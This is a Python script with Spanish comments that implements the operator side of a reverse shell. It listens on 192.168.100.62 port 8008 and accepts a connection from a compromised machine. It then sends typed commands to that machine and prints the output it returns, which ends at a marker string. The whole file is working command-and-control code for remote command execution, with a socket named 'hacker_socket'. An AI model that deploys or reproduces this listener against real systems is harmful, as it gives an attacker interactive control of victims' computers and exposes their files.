import socket

# Identificador para marcar el final del resultado del comando
IDENTIFIER = "<FIN_DEL_RESULTADO_DEL_COMANDO>"

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.100.62"
    Port = 8008
    socket_address = (IP, Port)
    
    # Vincular el socket a la dirección y el puerto
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Escuchando solicitudes de conexión entrantes")
    
    # Aceptar la conexión entrante
    hacker_socket, client_address = hacker_socket.accept()
    print("Conexión establecida con ", client_address)
    
    try:
        while True:
            command = input("Ingrese el comando ")
            # Enviar el comando codificado al hacker
            hacker_socket.send(command.encode())
            
            if command == "stop":
                # Cerrar el socket y salir del programa de manera segura si se recibe el comando "stop"
                hacker_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                # Enviar el comando "cd" al hacker si comienza con "cd"
                hacker_socket.send(command.encode())
                continue
            else:
                full_command_result = b''
                while True:
                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break

                    full_command_result += chunk
                
                # Imprimir el resultado completo del comando
                print(full_command_result.decode())
    except Exception:
        print("Ocurrió una excepción")
        hacker_socket.close()
